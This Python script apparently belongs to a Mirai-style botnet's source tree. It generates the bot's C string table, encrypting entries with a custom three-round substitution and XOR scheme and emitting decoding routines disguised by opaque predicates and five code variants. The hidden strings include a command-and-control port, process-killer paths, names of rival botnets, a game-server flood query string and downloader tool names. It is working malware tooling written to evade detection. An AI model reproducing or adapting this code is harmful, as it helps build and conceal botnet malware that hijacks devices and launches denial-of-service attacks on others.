#!/usr/bin/env python3
"""
3-round SPN obfuscation with S-box substitution + bit permutation + multi-stream XOR.
Generates bot/core/table.c with runtime deobfuscation code.
"""

import random

# ── Deterministic S-box generation ──────────────────────────────
def generate_sbox(seed):
    rng = random.Random(seed)
    values = list(range(256))
    rng.shuffle(values)
    sbox = bytes(values)
    inv = bytearray(256)
    for i, v in enumerate(values):
        inv[v] = i
    return sbox, bytes(inv)

SBOX, SBOX_INV = generate_sbox(0xC1A24B8E_DEADBEEF)
SBOX2, SBOX2_INV = generate_sbox(0x7F3E9D5C_2B1A4806)

# ── Key derivation ──────────────────────────────────────────────
def derive_key():
    k = 0
    k ^= 0xA3F81C4B0D9E6A27
    k = ((k << 13) | (k >> 51)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0x1234567890ABCDEF
    k = ((k << 7) | (k >> 57)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0x7B2E9C1D4F6A8E35
    k = ((k << 17) | (k >> 47)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0xD1C4E7A29B3F506C
    k = ((k << 23) | (k >> 41)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0x9E3A1F6C8B2D5A47
    k = ((k << 11) | (k >> 53)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0x4F1C8A2D6B9E37E5
    k = ((k << 19) | (k >> 45)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0x8C6D2A4F1E3B5C79
    k = ((k << 5) | (k >> 59)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0x3B7A1C5D9E2F4C68
    k = ((k << 29) | (k >> 35)) & 0xFFFFFFFFFFFFFFFF
    k ^= 0xE2D4F6A8C0B1E3F5
    return k

TABLE_KEY = derive_key()

# ── LCGs ────────────────────────────────────────────────────────
L_MUL = 0x5851F42D4C957F2D
L_ADD = 0x14057B7EF767814F
MASK64 = 0xFFFFFFFFFFFFFFFF

def lcg64(s):
    return ((s * L_MUL + L_ADD) & MASK64)

def lcg32(s):
    return ((s * 1103515245 + 12345) & 0xFFFFFFFF)

def lcg32b(s):
    return ((s * 0x41C64E6D + 0x3039) & 0xFFFFFFFF)

def lcg32c(s):
    return ((s * 0x6B8B4567 + 0x6D092B1D) & 0xFFFFFFFF)

# ── Bit operations ──────────────────────────────────────────────
def rol8(b, n):
    n &= 7
    return ((b << n) | (b >> (8 - n))) & 0xFF

def ror8(b, n):
    return rol8(b, (8 - n))

# ── 3-round SPN encode ─────────────────────────────────────────
def encode(data, eid):
    state64 = TABLE_KEY ^ ((eid + 1) * 0x1F)
    state32a = ((TABLE_KEY >> 32) ^ ((eid + 1) * 0x3D)) & 0xFFFFFFFF
    state32b = ((TABLE_KEY >> 16) ^ ((eid + 1) * 0x55)) & 0xFFFFFFFF
    state32c = ((TABLE_KEY >> 48) ^ ((eid + 1) * 0x7F)) & 0xFFFFFFFF
    state32d = ((TABLE_KEY ^ (eid + 1) * 0x91) >> 8) & 0xFFFFFFFF

    out = bytearray(data)
    for i in range(len(out)):
        state64 = lcg64(state64)
        state32a = lcg32(state32a)
        state32b = lcg32b(state32b)
        state32c = lcg32c(state32c)
        state32d = lcg32(state32d)

        k1 = ((state64 >> 32) ^ (state32a >> 8)) & 0xFF
        k2 = ((state32b >> 16) ^ (state32c >> 8)) & 0xFF
        k3 = ((state64 >> 16) ^ (state32d >> 16)) & 0xFF
        k1 ^= ((eid * i) + (i * 0x13)) & 0xFF
        k2 ^= ((eid * i * 3) + (i * 0x1F)) & 0xFF
        k3 ^= ((eid * i * 7) + (i * 0x2D)) & 0xFF

        b = out[i]
        # Round 1: XOR k1 → S-box → rotate
        b ^= k1
        b = SBOX[b]
        b = rol8(b, (i + 1) & 7)

        # Round 2: XOR k2 → S-box2 → rotate
        b ^= k2
        b = SBOX2[b]
        b = rol8(b, (i + 3) & 7)

        # Round 3: XOR k3 → S-box → rotate
        b ^= k3
        b = SBOX[b]
        b = rol8(b, (i + 5) & 7)

        out[i] = b
    return bytes(out)

# ── Format helpers ──────────────────────────────────────────────
def fmt_bytes(data):
    return ', '.join(f'0x{b:02X}' for b in data)

def fmt_hex(data):
    return '"' + ''.join(f'\\x{b:02X}' for b in data) + '"'

# ── Known plaintexts ────────────────────────────────────────────
PLAINTEXTS = {
    1: b'\x61\x1e',  # CNC port 7777 (LE bytes for port_t cast)
    3: b'/proc\x00',
    4: b'/exe\x00',
    5: b'/fd\x00',
    6: b'/proc/net/tcp\x00',
    10: b'TSource Engine Query\x00',
    11: b'/etc/resolv.conf\x00',
    12: b'nameserver \x00',
    23: b'/maps\x00',
    27: b'.anime\x00',
    28: b'MIRAI\x00', 29: b'SORA\x00', 30: b'OWARI\x00',
    31: b'JOSHO\x00', 32: b'APOLLO\x00', 33: b'MASUTA\x00',
    34: b'VAMP\x00', 35: b'QBOT\x00', 36: b'IRC\x00',
    37: b'SHINTO\x00', 38: b'OMNI\x00',
    39: b'wget\x00', 40: b'curl\x00', 41: b'tftp\x00', 42: b'reboot\x00',
    43: b'/stat\x00', 44: b'/comm\x00',
    54: b'/dev/null\x00', 55: b'/bin/busybox\x00',
    64: b'REMAITEN\x00POGO\x00HITO\x00KATANA\x00MIUREY\x00BASHMAL\x00XORDD\x00LIGHT\x00FREAK\x00DVR',
}

TABLE_NAMES = {
    1: "TABLE_CNC_PORT",
    3: "TABLE_KILLER_PROC", 4: "TABLE_KILLER_EXE", 5: "TABLE_KILLER_FD",
    6: "TABLE_KILLER_TCP",
    10: "TABLE_ATK_VSE", 11: "TABLE_ATK_RESOLVER", 12: "TABLE_ATK_NSERV",
    23: "TABLE_KILLER_MAPS", 27: "TABLE_KILLER_ANIME",
    28: "TABLE_MEM_MIRAI", 29: "TABLE_MEM_SORA", 30: "TABLE_MEM_OWARI",
    31: "TABLE_MEM_JOSHO", 32: "TABLE_MEM_APOLLO", 33: "TABLE_MEM_MASUTA",
    34: "TABLE_MEM_VAMP", 35: "TABLE_MEM_QBOT", 36: "TABLE_MEM_IRC",
    37: "TABLE_MEM_SHINTO", 38: "TABLE_MEM_OMNI",
    39: "TABLE_MISC_WGET", 40: "TABLE_MISC_CURL",
    41: "TABLE_MISC_TFTP", 42: "TABLE_MISC_REBOOT",
    43: "TABLE_KILLER_STAT", 44: "TABLE_KILLER_COMM",
    54: "TABLE_KILLER_DEVNULL", 55: "TABLE_KILLER_BUSYBOX",
    64: "TABLE_MEM_EXTRA",
}

# ── C code generation ───────────────────────────────────────────
def generate_c():
    lines = []
    lines.append('#define _GNU_SOURCE')
    lines.append('')
    lines.append('#ifdef DEBUG')
    lines.append('#include <stdio.h>')
    lines.append('#endif')
    lines.append('#include <stdint.h>')
    lines.append('#include <stdlib.h>')
    lines.append('')
    lines.append('#include "includes.h"')
    lines.append('#include "table.h"')
    lines.append('#include "util.h"')
    lines.append('')
    lines.append('static const uint8_t sbox_inv[256] = {')
    for i in range(0, 256, 16):
        lines.append('    ' + ', '.join(f'0x{b:02X}' for b in SBOX_INV[i:i+16]) + (',' if i < 240 else ''))
    lines.append('};')
    lines.append('')
    lines.append('static const uint8_t sbox2_inv[256] = {')
    for i in range(0, 256, 16):
        lines.append('    ' + ', '.join(f'0x{b:02X}' for b in SBOX2_INV[i:i+16]) + (',' if i < 240 else ''))
    lines.append('};')
    lines.append('')
    lines.append('static uint64_t table_key;')
    lines.append('struct table_value table[TABLE_MAX_KEYS];')
    lines.append('')
    lines.append('static void toggle_obf_a(uint8_t);')
    lines.append('static void toggle_obf_b(uint8_t);')
    lines.append('static void toggle_obf_c(uint8_t);')
    lines.append('static void toggle_obf_d(uint8_t);')
    lines.append('static void toggle_obf_e(uint8_t);')
    lines.append('static void add_entry(uint8_t, char *, int);')
    lines.append('static void (*volatile toggle_ptr)(uint8_t) = NULL;')
    lines.append('')
    lines.append('static void resolve_toggle(void)')
    lines.append('{')
    lines.append('    uint64_t sel = table_key;')
    lines.append('    uint64_t check = sel ^ 0xDEADBEEFCAFEBABEull;')
    lines.append('    if ((sel >> 40) == ((check >> 40) ^ 0xDE))')
    lines.append('    {')
    lines.append('        switch ((sel >> 40) & 7)')
    lines.append('        {')
    lines.append('            case 0: toggle_ptr = toggle_obf_a; break;')
    lines.append('            case 1: toggle_ptr = toggle_obf_b; break;')
    lines.append('            case 2: toggle_ptr = toggle_obf_c; break;')
    lines.append('            case 3: toggle_ptr = toggle_obf_d; break;')
    lines.append('            default: toggle_ptr = toggle_obf_e; break;')
    lines.append('        }')
    lines.append('    }')
    lines.append('    else')
    lines.append('    {')
    lines.append('        if ((uintptr_t)&toggle_ptr > 0x1000)')
    lines.append('            toggle_ptr = toggle_obf_c;')
    lines.append('        else')
    lines.append('            toggle_ptr = toggle_obf_c;')
    lines.append('    }')
    lines.append('}')
    lines.append('')
    lines.append('static uint64_t derive_key(void)')
    lines.append('{')
    lines.append('    uint64_t k = 0;')
    lines.append('    k ^= 0xA3F81C4B0D9E6A27ull;')
    lines.append('    k = (k << 13) | (k >> 51);')
    lines.append('    k ^= 0x1234567890ABCDEFull;')
    lines.append('    k = (k << 7) | (k >> 57);')
    lines.append('    k ^= 0x7B2E9C1D4F6A8E35ull;')
    lines.append('    k = (k << 17) | (k >> 47);')
    lines.append('    k ^= 0xD1C4E7A29B3F506Cull;')
    lines.append('    k = (k << 23) | (k >> 41);')
    lines.append('    k ^= 0x9E3A1F6C8B2D5A47ull;')
    lines.append('    k = (k << 11) | (k >> 53);')
    lines.append('    k ^= 0x4F1C8A2D6B9E37E5ull;')
    lines.append('    k = (k << 19) | (k >> 45);')
    lines.append('    k ^= 0x8C6D2A4F1E3B5C79ull;')
    lines.append('    k = (k << 5) | (k >> 59);')
    lines.append('    k ^= 0x3B7A1C5D9E2F4C68ull;')
    lines.append('    k = (k << 29) | (k >> 35);')
    lines.append('    k ^= 0xE2D4F6A8C0B1E3F5ull;')
    lines.append('    return k;')
    lines.append('}')
    lines.append('')
    lines.append('void table_init(void)')
    lines.append('{')
    lines.append('    table_key = derive_key();')
    lines.append('    resolve_toggle();')
    for eid in sorted(PLAINTEXTS.keys()):
        name = TABLE_NAMES.get(eid, f"UNKNOWN_{eid}")
        pt = PLAINTEXTS[eid]
        enc = encode(pt, eid)
        hx = fmt_hex(enc)
        lines.append(f'    add_entry({name}, {hx}, {len(enc)});')
    lines.append('}')
    lines.append('')
    lines.append('void table_unlock_val(uint8_t id)')
    lines.append('{')
    lines.append('    if (toggle_ptr == NULL || id > TABLE_MAX_KEYS)')
    lines.append('        return;')
    lines.append('    toggle_ptr(id);')
    lines.append('}')
    lines.append('')
    lines.append('void table_lock_val(uint8_t id)')
    lines.append('{')
    lines.append('    if (toggle_ptr == NULL || id > TABLE_MAX_KEYS)')
    lines.append('        return;')
    lines.append('    toggle_ptr(id);')
    lines.append('}')
    lines.append('')
    lines.append('char *table_retrieve_val(int id, int *len)')
    lines.append('{')
    lines.append('    struct table_value *val = &table[id];')
    lines.append('    if (len != NULL)')
    lines.append('        *len = (int)val->val_len;')
    lines.append('    return val->val;')
    lines.append('}')
    lines.append('')
    lines.append('static void add_entry(uint8_t id, char *buf, int buf_len)')
    lines.append('{')
    lines.append('    char *cpy = malloc(buf_len);')
    lines.append('    util_memcpy(cpy, buf, buf_len);')
    lines.append('    table[id].val = cpy;')
    lines.append('    table[id].val_len = (uint16_t)buf_len;')
    lines.append('}')
    lines.append('')
    lines.append('static uint64_t lcg_step(uint64_t s)')
    lines.append('{')
    lines.append('    return (s * 0x5851F42D4C957F2Dull) + 0x14057B7EF767814Full;')
    lines.append('}')
    lines.append('')
    lines.append('static uint32_t lcg32(uint32_t s)')
    lines.append('{')
    lines.append('    return (s * 1103515245) + 12345;')
    lines.append('}')
    lines.append('')
    lines.append('static uint32_t lcg32b(uint32_t s)')
    lines.append('{')
    lines.append('    return (s * 0x41C64E6D) + 0x3039;')
    lines.append('}')
    lines.append('')
    lines.append('static uint32_t lcg32c(uint32_t s)')
    lines.append('{')
    lines.append('    return (s * 0x6B8B4567) + 0x6D092B1D;')
    lines.append('}')
    lines.append('')
    lines.append('static uint32_t lcg32d(uint32_t s)')  # unused by toggle but needed by lcg3 in variants
    lines.append('{')
    lines.append('    return (s * 1103515245) + 12345;')
    lines.append('}')
    lines.append('')
    lines.append('static uint8_t ror8(uint8_t b, int n)')
    lines.append('{')
    lines.append('    n &= 7;')
    lines.append('    return (uint8_t)((b >> n) | (b << (8 - n)));')
    lines.append('}')
    lines.append('')

    # Generate toggle variants with 3-round decode
    lines.append(generate_toggle_variants())

    out = '\n'.join(lines)
    return out

def generate_toggle_variants():
    """Generate 5 toggle variants with different LCG orderings and opaque predicates."""
    variants = []
    names = ['toggle_obf_a', 'toggle_obf_b', 'toggle_obf_c', 'toggle_obf_d', 'toggle_obf_e']
    # Different stream permutations for each variant
    streams = [
        # (k1_lcg, k2_lcg, k3_lcg) — which LCG produces which key
        (1, 2, 3),  # a: k1=lcg64, k2=lcg32, k3=lcg32b
        (2, 3, 1),  # b: k1=lcg32, k2=lcg32b, k3=lcg64
        (3, 1, 2),  # c: k1=lcg32b, k2=lcg64, k3=lcg32
        (1, 3, 2),  # d: k1=lcg64, k2=lcg32b, k3=lcg32
        (2, 1, 3),  # e: k1=lcg32, k2=lcg64, k3=lcg32b
    ]

    for var_idx, name in enumerate(names):
        sk1, sk2, sk3 = streams[var_idx]
        lines = []
        lines.append(f'static void {name}(uint8_t id)')
        lines.append('{')
        lines.append('    int i;')
        lines.append('    struct table_value *val = &table[id];')
        lines.append('    uint64_t s1 = table_key ^ ((uint64_t)(id + 1) * 0x1f);')
        lines.append('    uint32_t s2 = (uint32_t)(table_key >> 32) ^ ((uint32_t)(id + 1) * 0x3d);')
        lines.append('    uint32_t s3 = (uint32_t)(table_key >> 16) ^ ((uint32_t)(id + 1) * 0x55);')
        lines.append('    uint32_t s4 = (uint32_t)(table_key >> 48) ^ ((uint32_t)(id + 1) * 0x7f);')
        lines.append('    uint32_t s5 = (uint32_t)((table_key ^ (id + 1) * 0x91) >> 8);')

        # Opaque predicate
        if var_idx % 2 == 0:
            lines.append('    uintptr_t sentinel = (uintptr_t)val->val;')
            lines.append('    if (sentinel != (uintptr_t)val->val) return;')

        lines.append('')
        lines.append('    for (i = 0; i < val->val_len; i++)')
        lines.append('    {')
        lines.append('        uint8_t k1, k2, k3, b;')

        # Step LCGs
        lines.append('        s1 = lcg_step(s1);')
        lines.append('        s2 = lcg32(s2);')
        lines.append('        s3 = lcg32b(s3);')
        lines.append('        s4 = lcg32c(s4);')
        lines.append('        s5 = lcg32d(s5);')

        # Derive keys based on stream permutation
        ks = []
        for sk in [sk1, sk2, sk3]:
            if sk == 1:
                ks.append('((s1 >> 32) ^ (s2 >> 8)) & 0xFF ^ ((uint8_t)((id * i) + (i * 0x13)))')
            elif sk == 2:
                ks.append('((s3 >> 16) ^ (s4 >> 8)) & 0xFF ^ ((uint8_t)((id * i * 3) + (i * 0x1F)))')
            else:
                ks.append('((s1 >> 16) ^ (s5 >> 16)) & 0xFF ^ ((uint8_t)((id * i * 7) + (i * 0x2D)))')

        lines.append(f'        k1 = {ks[0]};')
        lines.append(f'        k2 = {ks[1]};')
        lines.append(f'        k3 = {ks[2]};')
        lines.append('')
        lines.append('        b = val->val[i];')
        lines.append('')

        # Reverse 3-round SPN: undo rotate → inverse S-box → XOR
        lines.append('        b = ror8(b, (i + 5) & 7);')
        lines.append('        b = sbox_inv[b];')
        lines.append('        b ^= k3;')
        lines.append('')
        lines.append('        b = ror8(b, (i + 3) & 7);')
        lines.append('        b = sbox2_inv[b];')
        lines.append('        b ^= k2;')
        lines.append('')
        lines.append('        b = ror8(b, (i + 1) & 7);')
        lines.append('        b = sbox_inv[b];')
        lines.append('        b ^= k1;')
        lines.append('')
        lines.append('        val->val[i] = b;')

        # Opaque predicate at end
        if var_idx % 3 == 0:
            lines.append('        if ((uintptr_t)&k1 == (uintptr_t)&k1) { }')  # tautology

        lines.append('    }')
        lines.append('}')
        lines.append('')

        variants.append('\n'.join(lines))

    return '\n'.join(variants)


# ── Main ────────────────────────────────────────────────────────
def main():
    print(f"Table key = 0x{TABLE_KEY:016X}")
    print(f"S-box generated: 256 entries")

    for eid in sorted(PLAINTEXTS.keys()):
        if eid not in TABLE_NAMES:
            continue
        pt = PLAINTEXTS[eid]
        enc = encode(pt, eid)
        name = TABLE_NAMES[eid]
        print(f"  {name} (id {eid}): {len(pt)} bytes → {len(enc)} bytes enc")

    c_source = generate_c()
    with open('bot/core/table.c', 'w') as f:
        f.write(c_source)
    print(f"\nWrote bot/core/table.c with {len(PLAINTEXTS)} entries")

if __name__ == '__main__':
    main()
